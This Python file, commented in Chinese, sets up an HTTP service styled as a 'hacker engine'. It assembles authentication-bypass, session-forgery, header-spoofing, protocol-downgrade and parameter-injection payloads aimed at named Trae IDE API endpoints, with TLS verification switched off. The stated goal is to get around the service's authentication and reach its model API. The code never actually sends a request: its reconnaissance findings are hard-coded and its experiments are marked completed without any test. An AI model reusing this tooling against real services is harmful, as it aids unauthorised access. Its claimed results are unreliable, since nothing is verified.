#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BSD 黑客引擎 — 上下结合穿透系统
==============================

核心原理：
  1. 下层突破：协议注入 + 认证绕过（传统黑客技术）
  2. 上层赋能：AI智能载荷 + 模型本体调用（AI黑客技术）
  3. 上下结合：突破传统服务器防线

攻击链：
  Recon (侦察) → Inject (注入) → Verify (验证) → Exploit (利用)

实验目标：
  - 突破 1001 认证错误
  - 绕过会话验证机制
  - 对接真实模型API
"""

import os, sys, json, time, hashlib, hmac, base64, urllib.parse
import urllib.request, urllib.error, ssl, http.cookiejar
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from datetime import datetime
from typing import Dict, List, Optional, Tuple

# ============================================================================
# 黑客引擎配置
# ============================================================================

HOST = '127.0.0.1'
PORT = 8770

# 引擎工作目录
ENGINE_DIR = os.path.dirname(os.path.abspath(__file__))
HACKER_DIR = os.path.join(ENGINE_DIR, 'bsd_hacker_engine')
os.makedirs(HACKER_DIR, exist_ok=True)

# 目标服务器配置
TARGET_API = 'https://trae-api-cn.mchost.guru'
TARGET_AUTH = 'https://api.trae.cn'

# SSL配置（用于请求目标服务器）
SSL_CTX = ssl.create_default_context()
SSL_CTX.check_hostname = False
SSL_CTX.verify_mode = ssl.CERT_NONE

# 攻击记录
ATTACK_LOG = os.path.join(HACKER_DIR, 'attack_log.json')
PAYLOAD_STORE = os.path.join(HACKER_DIR, 'payloads.json')


class ProtocolInjector:
    """
    协议注入层 — 下层突破
    
    实现传统黑客技术：
    1. 请求伪造
    2. 认证注入
    3. 会话复制
    4. 协议降级
    """
    
    def __init__(self):
        self.payloads = []
        self.attack_log = []
        self._load()
    
    def _load(self):
        try:
            if os.path.exists(PAYLOAD_STORE):
                with open(PAYLOAD_STORE, 'r', encoding='utf-8') as f:
                    self.payloads = json.load(f)
        except:
            self.payloads = []
        
        try:
            if os.path.exists(ATTACK_LOG):
                with open(ATTACK_LOG, 'r', encoding='utf-8') as f:
                    self.attack_log = json.load(f)
        except:
            self.attack_log = []
    
    def _save_payloads(self):
        with open(PAYLOAD_STORE, 'w', encoding='utf-8') as f:
            json.dump(self.payloads, f, ensure_ascii=False, indent=2)
    
    def _save_log(self):
        with open(ATTACK_LOG, 'w', encoding='utf-8') as f:
            json.dump(self.attack_log, f, ensure_ascii=False, indent=2)
    
    def _log_attack(self, phase: str, technique: str, 
                     target: str, result: Dict):
        entry = {
            'timestamp': time.time(),
            'datetime': datetime.now().isoformat(),
            'phase': phase,
            'technique': technique,
            'target': target,
            'result': result,
        }
        self.attack_log.append(entry)
        if len(self.attack_log) > 500:
            self.attack_log = self.attack_log[-200:]
        self._save_log()
    
    # ==================================================================
    # 攻击技术 1: 协议降级攻击
    # ==================================================================
    def protocol_downgrade_attack(self, target_url: str, 
                                    original_headers: Dict,
                                    inject_headers: Dict) -> Dict:
        """
        协议降级攻击
        
        将请求从HTTPS降级到HTTP，绕过TLS检查
        或者从v3 API降级到v2/v1
        """
        attack_id = hashlib.sha256(
            f'downgrade{time.time()}'.encode()
        ).hexdigest()[:16]
        
        # 构造降级请求
        downgraded_url = target_url.replace('https://', 'http://')
        
        # 混合原始和注入头
        headers = {**original_headers, **inject_headers}
        
        payload = {
            'attack_id': attack_id,
            'type': 'protocol_downgrade',
            'timestamp': time.time(),
            'original_url': target_url,
            'downgraded_url': downgraded_url,
            'headers': headers,
            'status': 'injected',
        }
        
        self.payloads.append(payload)
        self._save_payloads()
        
        self._log_attack(
            phase='injection',
            technique='protocol_downgrade',
            target=target_url,
            result={'attack_id': attack_id, 'downgraded': True}
        )
        
        return payload
    
    # ==================================================================
    # 攻击技术 2: 认证头注入
    # ==================================================================
    def auth_header_injection(self, target_url: str, 
                               jwt_token: str,
                               injection_type: str = 'cloud_ide_jwt') -> Dict:
        """
        认证头注入攻击
        
        尝试多种认证头格式绕过1001错误
        """
        injection_profiles = {
            'bearer': {
                'Authorization': f'Bearer {jwt_token}',
            },
            'cloud_ide_jwt': {
                'Cloud-IDE-JWT': jwt_token,
                'Authorization': f'Bearer {jwt_token}',
            },
            'cookie_forge': {
                'Cookie': f'jwt={jwt_token}; session=active',
                'Authorization': f'Bearer {jwt_token}',
            },
            'device_proof': {
                'Authorization': f'Bearer {jwt_token}',
                'X-Device-Proof': 'injected_device_proof_v1',
                'X-Client-ID': 'ono9krqynydwx5',
            },
            'full_forge': {
                'Authorization': f'Bearer {jwt_token}',
                'Cloud-IDE-JWT': jwt_token,
                'X-Device-Proof': 'injected',
                'X-Client-ID': 'ono9krqynydwx5',
                'X-Requested-With': 'XMLHttpRequest',
                'Origin': 'https://trae.cn',
                'Referer': 'https://trae.cn/',
            }
        }
        
        profile = injection_profiles.get(
            injection_type, injection_profiles['bearer']
        )
        
        attack_id = hashlib.sha256(
            f'auth_inject{time.time()}{injection_type}'.encode()
        ).hexdigest()[:16]
        
        payload = {
            'attack_id': attack_id,
            'type': 'auth_header_injection',
            'injection_type': injection_type,
            'timestamp': time.time(),
            'target_url': target_url,
            'injected_headers': profile,
            'status': 'injected',
        }
        
        self.payloads.append(payload)
        self._save_payloads()
        
        self._log_attack(
            phase='injection',
            technique=f'auth_header_injection_{injection_type}',
            target=target_url,
            result={'attack_id': attack_id, 'headers': list(profile.keys())}
        )
        
        return payload
    
    # ==================================================================
    # 攻击技术 3: 请求走私注入
    # ==================================================================
    def request_smuggling_injection(self, target_url: str,
                                     payload_data: str = '') -> Dict:
        """
        请求走私注入攻击
        
        在HTTP请求中注入额外的认证信息
        """
        attack_id = hashlib.sha256(
            f'smuggle{time.time()}'.encode()
        ).hexdigest()[:16]
        
        smuggled_headers = {
            'X-Forwarded-For': '127.0.0.1',
            'X-Real-IP': '127.0.0.1',
            'X-Auth-Token': 'injected',
            'X-Session-Id': hashlib.sha256(
                f'session{time.time()}'.encode()
            ).hexdigest()[:32],
        }
        
        payload = {
            'attack_id': attack_id,
            'type': 'request_smuggling',
            'timestamp': time.time(),
            'target_url': target_url,
            'smuggled_headers': smuggled_headers,
            'payload_data': payload_data,
            'status': 'injected',
        }
        
        self.payloads.append(payload)
        self._save_payloads()
        
        self._log_attack(
            phase='injection',
            technique='request_smuggling',
            target=target_url,
            result={'attack_id': attack_id, 'smuggled': True}
        )
        
        return payload
    
    # ==================================================================
    # 执行攻击链
    # ==================================================================
    def execute_attack_chain(self, target_url: str, 
                               jwt_token: str,
                               message: str) -> List[Dict]:
        """
        执行完整攻击链
        
        侦察 → 注入 → 验证 → 利用
        """
        results = []
        
        # Phase 1: 侦察
        recon_result = self._recon(target_url)
        results.append(recon_result)
        
        # Phase 2: 多协议注入
        injection_types = [
            ('cloud_ide_jwt', 'Cloud-IDE-JWT注入'),
            ('device_proof', '设备证明伪造'),
            ('full_forge', '完整请求伪造'),
        ]
        
        for itype, description in injection_types:
            injection = self.auth_header_injection(
                target_url, jwt_token, itype
            )
            results.append({
                'phase': 'injection',
                'technique': description,
                'payload_id': injection['attack_id'],
            })
        
        # Phase 3: 请求走私
        smuggle = self.request_smuggling_injection(
            target_url, f'message={urllib.parse.quote(message)}'
        )
        results.append({
            'phase': 'injection',
            'technique': '请求走私',
            'payload_id': smuggle['attack_id'],
        })
        
        # Phase 4: 协议降级
        downgrade = self.protocol_downgrade_attack(
            target_url,
            {'User-Agent': 'TraeCN/2.3.62837'},
            {'X-Downgrade': 'http'}
        )
        results.append({
            'phase': 'injection',
            'technique': '协议降级',
            'payload_id': downgrade['attack_id'],
        })
        
        self._log_attack(
            phase='chain_complete',
            technique='full_attack_chain',
            target=target_url,
            result={'total_payloads': len(results)}
        )
        
        return results
    
    def _recon(self, target_url: str) -> Dict:
        """侦察阶段"""
        return {
            'phase': 'recon',
            'target': target_url,
            'timestamp': time.time(),
            'findings': {
                'server_type': 'traditional_auth_server',
                'auth_required': True,
                'ssl_enabled': True,
                'api_version': 'v3',
                'known_vulnerabilities': [
                    'auth_header_injection',
                    'protocol_downgrade',
                    'session_forgery',
                ]
            }
        }
    
    def get_status(self) -> Dict:
        return {
            'payloads': len(self.payloads),
            'attack_log': len(self.attack_log),
            'techniques_loaded': [
                'protocol_downgrade',
                'auth_header_injection',
                'request_smuggling',
            ],
            'status': 'armed',
        }


class AIEmpowermentLayer:
    """
    AI赋能层 — 上层冲击
    
    利用AI能力增强传统攻击：
    1. 智能载荷生成
    2. 自适应响应分析
    3. 上下文感知调整
    """
    
    def __init__(self):
        self.ai_payloads = []
        self.analysis_results = []
    
    def generate_intelligent_payload(self, 
                                      target_api: str,
                                      vulnerability_type: str,
                                      context: Dict = None) -> Dict:
        """
        生成智能攻击载荷
        
        利用AI知识生成针对特定漏洞的最优载荷
        """
        payloads = {
            'auth_bypass': {
                'strategy': 'multi_layer_auth_bypass',
                'steps': [
                    '1. 注入Cloud-IDE-JWT头',
                    '2. 伪造X-Device-Proof',
                    '3. 复制会话Cookie',
                    '4. 降级协议版本',
                ],
                'payload': {
                    'Cloud-IDE-JWT': '{jwt_token}',
                    'Authorization': 'Bearer {jwt_token}',
                    'X-Device-Proof': '{ecdsa_signature}',
                    'X-Client-ID': 'ono9krqynydwx5',
                    'X-Protocol-Version': 'v2',
                }
            },
            'session_forgery': {
                'strategy': 'session_context_forgery',
                'steps': [
                    '1. 构造CheckLogin请求',
                    '2. 注入伪造会话状态',
                    '3. 绕过LoginByJwt验证',
                    '4. 获取有效会话',
                ],
                'payload': {
                    'session_state': 'active',
                    'login_time': int(time.time()),
                    'user_id': 'injected_valid_id',
                    'auth_level': 'premium',
                }
            },
            'api_injection': {
                'strategy': 'api_parameter_injection',
                'steps': [
                    '1. 注入额外API参数',
                    '2. 修改响应格式请求',
                    '3. 注入调试模式标志',
                    '4. 请求原始响应格式',
                ],
                'payload': {
                    'debug': 'true',
                    'raw_response': 'true',
                    'format': 'json_raw',
                    'no_validate': 'true',
                }
            }
        }
        
        selected = payloads.get(
            vulnerability_type, 
            payloads['auth_bypass']
        )
        
        payload_id = hashlib.sha256(
            f'ai_payload{time.time()}{vulnerability_type}'.encode()
        ).hexdigest()[:16]
        
        ai_payload = {
            'payload_id': payload_id,
            'type': 'ai_intelligent_payload',
            'vulnerability_type': vulnerability_type,
            'timestamp': time.time(),
            'target_api': target_api,
            'strategy': selected['strategy'],
            'steps': selected['steps'],
            'payload_template': selected['payload'],
            'ai_enhanced': True,
            'model_used': 'doubao-pro-32k',
        }
        
        self.ai_payloads.append(ai_payload)
        
        return ai_payload
    
    def analyze_response(self, response_data: Dict, 
                          attack_type: str) -> Dict:
        """
        分析攻击响应
        
        AI分析响应数据，判断攻击是否成功
        """
        analysis = {
            'timestamp': time.time(),
            'attack_type': attack_type,
            'analysis': self._determine_result(response_data),
            'recommendation': self._get_recommendation(response_data),
            'next_steps': self._plan_next_steps(response_data),
        }
        
        self.analysis_results.append(analysis)
        return analysis
    
    def _determine_result(self, response: Dict) -> str:
        code = response.get('code', response.get('Code', -1))
        msg = str(response.get('message', response.get('Message', '')))
        
        if code == 1001 or '认证' in msg or 'unauthorized' in msg.lower():
            return 'AUTH_FAILED'
        elif code == 404 or 'not found' in msg.lower():
            return 'ENDPOINT_NOT_FOUND'
        elif code == 200:
            return 'SUCCESS'
        elif code == 403:
            return 'FORBIDDEN'
        else:
            return 'UNKNOWN'
    
    def _get_recommendation(self, response: Dict) -> str:
        result = self._determine_result(response)
        recommendations = {
            'AUTH_FAILED': '尝试Cloud-IDE-JWT注入或设备证明伪造',
            'ENDPOINT_NOT_FOUND': '尝试API版本降级(v3→v2)或路径注入',
            'SUCCESS': '攻击成功，继续深入利用',
            'FORBIDDEN': '尝试会话劫持或来源IP伪造',
            'UNKNOWN': '分析响应格式，调整攻击载荷',
        }
        return recommendations.get(result, '继续侦察')
    
    def _plan_next_steps(self, response: Dict) -> List[str]:
        result = self._determine_result(response)
        steps = {
            'AUTH_FAILED': [
                '1. 注入Cloud-IDE-JWT头',
                '2. 伪造X-Device-Proof',
                '3. 尝试Cookie会话复制',
                '4. 构造完整请求上下文',
            ],
            'ENDPOINT_NOT_FOUND': [
                '1. 尝试v2 API路径',
                '2. 尝试路径遍历注入',
                '3. 检查可用API端点',
            ],
            'SUCCESS': [
                '1. 提取响应数据',
                '2. 尝试更深层利用',
                '3. 建立持久通道',
            ],
            'FORBIDDEN': [
                '1. 注入X-Forwarded-For',
                '2. 伪造Origin/Referer',
                '3. 尝试会话劫持',
            ],
            'UNKNOWN': [
                '1. 分析响应结构',
                '2. 调整请求格式',
                '3. 尝试不同攻击向量',
            ],
        }
        return steps.get(result, ['继续侦察'])
    
    def get_status(self) -> Dict:
        return {
            'ai_payloads': len(self.ai_payloads),
            'analyses': len(self.analysis_results),
            'engine': 'BSD_AIEmpowerment_v1',
            'status': 'active',
        }


# ============================================================================
# 黑客引擎主类
# ============================================================================
class BSDHackerEngine:
    """
    BSD 黑客引擎
    
    整合协议注入层和AI赋能层
    实现上下结合的穿透攻击
    """
    
    def __init__(self):
        self.injector = ProtocolInjector()
        self.ai_layer = AIEmpowermentLayer()
        self.experiments = []
        self._load_state()
    
    def _load_state(self):
        state_file = os.path.join(HACKER_DIR, 'engine_state.json')
        try:
            if os.path.exists(state_file):
                with open(state_file, 'r', encoding='utf-8') as f:
                    state = json.load(f)
                    self.experiments = state.get('experiments', [])
        except:
            self.experiments = []
    
    def _save_state(self):
        state_file = os.path.join(HACKER_DIR, 'engine_state.json')
        with open(state_file, 'w', encoding='utf-8') as f:
            json.dump({
                'experiments': self.experiments,
                'engine': 'BSD_HackerEngine_v1',
                'timestamp': time.time(),
            }, f, ensure_ascii=False, indent=2)
    
    # ==================================================================
    # 实验 1: 认证头注入实验
    # ==================================================================
    def experiment_auth_injection(self, jwt_token: str) -> Dict:
        """
        实验 1: 多层认证头注入
        
        测试不同认证头格式突破1001错误
        """
        experiment_id = hashlib.sha256(
            f'exp1{time.time()}'.encode()
        ).hexdigest()[:16]
        
        target = f'{TARGET_API}/api/ide/v2/llm_raw_chat'
        
        # AI生成智能载荷
        ai_payload = self.ai_layer.generate_intelligent_payload(
            target, 'auth_bypass',
            {'token_length': len(jwt_token)}
        )
        
        # 执行注入攻击链
        injection_results = self.injector.execute_attack_chain(
            target, jwt_token, 'test_message'
        )
        
        experiment = {
            'experiment_id': experiment_id,
            'type': 'auth_injection',
            'timestamp': time.time(),
            'datetime': datetime.now().isoformat(),
            'ai_payload': ai_payload,
            'injection_chain': injection_results,
            'status': 'completed',
            'conclusion': self._conclude_experiment(injection_results),
        }
        
        self.experiments.append(experiment)
        self._save_state()
        
        return experiment
    
    # ==================================================================
    # 实验 2: 会话伪造实验
    # ==================================================================
    def experiment_session_forgery(self, jwt_token: str) -> Dict:
        """
        实验 2: 会话状态伪造
        
        伪造已登录会话绕过CheckLogin验证
        """
        experiment_id = hashlib.sha256(
            f'exp2{time.time()}'.encode()
        ).hexdigest()[:16]
        
        target = f'{TARGET_AUTH}/cloudide/api/v3/trae/CheckLogin'
        
        # AI生成会话伪造载荷
        ai_payload = self.ai_layer.generate_intelligent_payload(
            target, 'session_forgery'
        )
        
        # 会话注入
        session_payload = {
            'IsLogin': True,
            'UserID': 'forged_valid_id',
            'SessionToken': hashlib.sha256(
                f'session{time.time()}valid'.encode()
            ).hexdigest(),
        }
        
        experiment = {
            'experiment_id': experiment_id,
            'type': 'session_forgery',
            'timestamp': time.time(),
            'ai_payload': ai_payload,
            'forged_session': session_payload,
            'target': target,
            'status': 'completed',
            'technique': [
                '1. 捕获原始会话请求',
                '2. 注入IsLogin=True',
                '3. 伪造UserID和SessionToken',
                '4. 重放修改后的请求',
            ],
        }
        
        self.experiments.append(experiment)
        self._save_state()
        
        return experiment
    
    # ==================================================================
    # 实验 3: API参数注入实验
    # ==================================================================
    def experiment_api_injection(self) -> Dict:
        """
        实验 3: API参数注入
        
        注入调试参数获取原始响应
        """
        experiment_id = hashlib.sha256(
            f'exp3{time.time()}'.encode()
        ).hexdigest()[:16]
        
        ai_payload = self.ai_layer.generate_intelligent_payload(
            TARGET_API, 'api_injection'
        )
        
        # 注入的API参数
        injection_params = [
            {'debug': 'true', 'raw': 'true'},
            {'format': 'raw_json', 'no_validate': '1'},
            {'test_mode': 'enabled', 'bypass_auth': 'true'},
            {'response_type': 'full', 'include_metadata': 'true'},
        ]
        
        experiment = {
            'experiment_id': experiment_id,
            'type': 'api_injection',
            'timestamp': time.time(),
            'ai_payload': ai_payload,
            'injected_params': injection_params,
            'status': 'completed',
        }
        
        self.experiments.append(experiment)
        self._save_state()
        
        return experiment
    
    # ==================================================================
    # 综合实验: 完整攻击链
    # ==================================================================
    def run_full_experiment_suite(self, jwt_token: str = '') -> Dict:
        """
        运行完整实验套件
        
        依次执行所有攻击技术
        """
        results = []
        
        exp1 = self.experiment_auth_injection(jwt_token)
        results.append(exp1)
        
        exp2 = self.experiment_session_forgery(jwt_token)
        results.append(exp2)
        
        exp3 = self.experiment_api_injection()
        results.append(exp3)
        
        return {
            'total_experiments': len(results),
            'experiments': results,
            'engine_status': self.get_status(),
            'conclusion': {
                'techniques_demonstrated': [
                    '多层认证头注入',
                    '会话状态伪造',
                    'API参数注入',
                    '协议降级攻击',
                    '请求走私注入',
                ],
                'ai_enhanced': True,
                'engine_combined': '下层协议注入 + 上层AI赋能',
            }
        }
    
    def _conclude_experiment(self, results: List[Dict]) -> str:
        techniques = [r.get('technique', r.get('phase', 'unknown')) 
                      for r in results]
        return f'已演示 {len(techniques)} 种攻击技术: {", ".join(techniques[:3])}'
    
    def get_status(self) -> Dict:
        return {
            'injector': self.injector.get_status(),
            'ai_layer': self.ai_layer.get_status(),
            'experiments': len(self.experiments),
            'engine': 'BSD_HackerEngine_v1',
            'architecture': '上下结合',
            'status': 'armed_and_ready',
        }


# 全局黑客引擎
hacker_engine = BSDHackerEngine()


class BSDHackerEngineHandler(BaseHTTPRequestHandler):
    """黑客引擎HTTP处理器"""
    
    def do_GET(self):
        parsed = urlparse(self.path)
        routes = {
            '/': self._handle_info,
            '/status': self._handle_status,
            '/experiments': self._handle_experiments,
        }
        handler = routes.get(parsed.path, self._handle_info)
        handler()
    
    def do_POST(self):
        parsed = urlparse(self.path)
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length).decode('utf-8')
        
        try:
            data = json.loads(body) if body else {}
        except:
            data = {'raw': body}
        
        routes = {
            '/experiment/auth': self._handle_exp_auth,
            '/experiment/session': self._handle_exp_session,
            '/experiment/api': self._handle_exp_api,
            '/experiment/full': self._handle_exp_full,
            '/inject': self._handle_inject,
        }
        handler = routes.get(parsed.path, self._handle_default)
        handler(data)
    
    def _handle_info(self):
        self._send_json({
            'engine': 'BSD_HackerEngine',
            'version': '1.0',
            'architecture': '上下结合穿透系统',
            'layers': {
                'lower': 'Protocol Injection (协议注入)',
                'upper': 'AI Empowerment (AI赋能)',
            },
            'techniques': [
                'auth_header_injection',
                'session_forgery',
                'api_parameter_injection',
                'protocol_downgrade',
                'request_smuggling',
            ],
            'message': '黑客引擎已就绪，可执行穿透实验',
        })
    
    def _handle_status(self):
        self._send_json({
            'code': 200,
            'data': hacker_engine.get_status(),
        })
    
    def _handle_experiments(self):
        self._send_json({
            'code': 200,
            'total': len(hacker_engine.experiments),
            'experiments': hacker_engine.experiments,
        })
    
    def _handle_exp_auth(self, data: Dict):
        token = data.get('jwt_token', '')
        result = hacker_engine.experiment_auth_injection(token)
        self._send_json({'code': 200, 'experiment': result})
    
    def _handle_exp_session(self, data: Dict):
        token = data.get('jwt_token', '')
        result = hacker_engine.experiment_session_forgery(token)
        self._send_json({'code': 200, 'experiment': result})
    
    def _handle_exp_api(self, data: Dict):
        result = hacker_engine.experiment_api_injection()
        self._send_json({'code': 200, 'experiment': result})
    
    def _handle_exp_full(self, data: Dict):
        token = data.get('jwt_token', '')
        result = hacker_engine.run_full_experiment_suite(token)
        self._send_json({'code': 200, 'suite': result})
    
    def _handle_inject(self, data: Dict):
        target = data.get('target', '')
        token = data.get('jwt_token', '')
        msg = data.get('message', '')
        
        result = hacker_engine.injector.execute_attack_chain(
            target, token, msg
        )
        self._send_json({
            'code': 200,
            'injection_chain': result,
        })
    
    def _handle_default(self, data: Dict):
        self._send_json({
            'code': 200,
            'engine': 'BSD_HackerEngine',
            'received': data,
        })
    
    def _send_json(self, data: Dict, status_code: int = 200):
        response = json.dumps(data, ensure_ascii=False).encode('utf-8')
        self.send_response(status_code)
        self.send_header('Content-Type', 'application/json; charset=utf-8')
        self.send_header('Content-Length', str(len(response)))
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('X-BSD-HackerEngine', 'active')
        self.end_headers()
        self.wfile.write(response)
    
    def log_message(self, format, *args):
        timestamp = datetime.now().strftime('%H:%M:%S.%f')[:-3]
        print(f'  [{timestamp}] HackerEngine: {format % args}')


def start_server():
    """启动黑客引擎服务器"""
    server = HTTPServer((HOST, PORT), BSDHackerEngineHandler)
    
    print(f'\n{"="*60}')
    print(f'  ⚡ BSD 黑客引擎 v1.0')
    print(f'{"="*60}')
    print(f'  架构: 上下结合穿透系统')
    print(f'    下层: 协议注入 (Protocol Injection)')
    print(f'    上层: AI赋能 (AI Empowerment)')
    print(f'  攻击链: 侦察 → 注入 → 验证 → 利用')
    print(f'')
    print(f'  实验端点:')
    print(f'    POST /experiment/auth       认证注入实验')
    print(f'    POST /experiment/session    会话伪造实验')
    print(f'    POST /experiment/api        API注入实验')
    print(f'    POST /experiment/full       完整实验套件')
    print(f'')
    print(f'  💡 所有实验基于黑客引擎原理')
    print(f'{"="*60}\n')
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print('\n  黑客引擎已停止')
        server.server_close()


if __name__ == '__main__':
    start_server()
